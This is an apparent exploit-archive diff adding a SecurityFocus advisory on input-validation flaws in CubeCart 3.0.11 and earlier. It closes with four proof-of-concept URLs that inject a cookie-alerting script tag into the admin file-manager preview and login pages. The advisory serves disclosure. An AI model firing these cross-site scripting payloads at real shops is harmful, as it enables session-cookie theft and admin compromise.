@@ -1,0 +1,12 @@
+source: http://www.securityfocus.com/bid/19563/info
+
+CubeCart is prone to multiple input-validation vulnerabilities, including cross-site scripting and SQL-injection issues, because the application fails to properly sanitize user-supplied input. 
+
+A successful exploit of these vulnerabilities could allow an attacker to compromise the application, access or modify data, steal cookie-based authentication credentials, or even exploit vulnerabilities in the underlying database implementation. Other attacks are also possible.
+
+CubeCart 3.0.11 and earlier versions are vulnerable to these issues; other versions may also be affected.
+
+http://www,example.com/[target]/[path_to_cubecart]/admin/filemanager/preview.php?file="><script>alert(document.cookie)</script>
+http://www,example.com/[target]/[path_to_cubecart]/admin/filemanager/preview.php?file=1&x="><script>alert(document.cookie)</script>
+http://www,example.com/[target]/[path_to_cubecart]/admin/filemanager/preview.php?file=1&y="><script>alert(document.cookie)</script>
+http://www,example.com/[target]/[path_to_cubecart]/admin/login.php?email="><script>alert(document.cookie)</script>
